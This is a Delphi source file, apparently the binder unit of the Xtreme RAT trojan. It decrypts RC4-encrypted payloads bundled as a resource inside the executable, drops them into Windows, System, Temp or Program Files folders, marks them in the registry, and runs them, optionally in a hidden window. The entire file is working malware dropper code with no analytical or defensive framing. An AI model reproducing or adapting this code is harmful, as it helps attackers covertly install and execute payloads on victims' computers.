Unit UnitBinder;

interface

uses
  windows,
  UnitCryptString,
  UnitConfigs,
  Functions;

function LoadBinderSettings: WideString;
procedure ExecutarBinder(Config: TConfiguracoes);

implementation

function LoadBinderSettings: WideString;
var
  ResourceLocation: HRSRC;
  ResourceSize: dword;
  ResourceHandle: THandle;
  ResourcePointer: pointer;
begin
  Result := '';
  ResourceLocation := FindResourceW(hInstance, 'XTREMEBINDER', MakeIntResourceW(10));
  ResourceSize := SizeofResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  ResourcePointer := LockResource(ResourceHandle);
  if ResourcePointer <> nil then
  begin
    SetLength(Result, ResourceSize div 2);
    CopyMemory(@Result[1], ResourcePointer, ResourceSize);
    FreeResource(ResourceHandle);
  end;
end;

procedure ExecutarBinder(Config: TConfiguracoes);
type
  TTempData = Record
    Filename: Array[0..260] of WideChar;
    FileSize: int64;
    ExtractTo: integer;
    Action: integer;
    ExecuteAllTime: boolean;
  end;
var
  BinderBuffer, BindFile, TempStr: WideString;
  TempData: TTempData;
begin
  // Exectar binder...
  BinderBuffer := LoadBinderSettings;
  if BinderBuffer <> '' then EnDecryptStrRC4B(@BinderBuffer[1], Length(BinderBuffer) * 2, WideString('BINDER'));

  if BinderBuffer <> '' then
  while BinderBuffer <> '' do
  begin
    TempStr := '';
    BindFile := '';

    ZeroMemory(@TempData, SizeOf(TempData));
    CopyMemory(@TempData, @BinderBuffer[1], SizeOf(TempData));
    Delete(BinderBuffer, 1, SizeOf(TempData));

    TempStr := Copy(BinderBuffer, 1, TempData.FileSize div 2);
    Delete(BinderBuffer, 1, TempData.FileSize div 2);

    if TempData.ExecuteAllTime = false then
    begin
      if LerReg(HKEY_CURRENT_USER, SomarPWideChar('SOFTWARE\', Config.Mutex), WideString(TempData.Filename), '') = 'OK' then Continue else
      Write2Reg(HKEY_CURRENT_USER, SomarPWideChar('SOFTWARE\', Config.Mutex), TempData.Filename, 'OK');
    end;

    if TempData.ExtractTo = 0 then
    BindFile := MyWindowsFolder + WideString(TempData.Filename) else
    if TempData.ExtractTo = 1 then
    BindFile := MySystemFolder + WideString(TempData.Filename) else
    if TempData.ExtractTo = 2 then
    BindFile := MyRootFolder + WideString(TempData.Filename) else
    if TempData.ExtractTo = 3 then
    BindFile := MyTempFolder + WideString(TempData.Filename) else
    if TempData.ExtractTo = 4 then
    begin
      if GetProgramFilesDir <> '' then
      BindFile := SomarPWideChar(GetProgramFilesDir, '\') + WideString(TempData.Filename);
    end;

    if CriarArquivo(pWideChar(BindFile + '.exe'), WideString('OK'), 4) = False then
    BindFile := SomarPWideChar(MyTempFolder, '\') + WideString(TempData.Filename) else
    DeleteFileW(pWideChar(BindFile + '.xtr'));
    
    CriarArquivo(pWideChar(BindFile), pWideChar(TempStr), Length(TempStr) * 2);

    if TempData.Action = 2 then continue else
    if TempData.Action = 1 then ShellExecute(0, 'open', pWideChar(BindFile), nil, nil, SW_HIDE) else
    if TempData.Action = 0 then ShellExecute(0, 'open', pWideChar(BindFile), nil, nil, SW_NORMAL);
  end;
end;

end.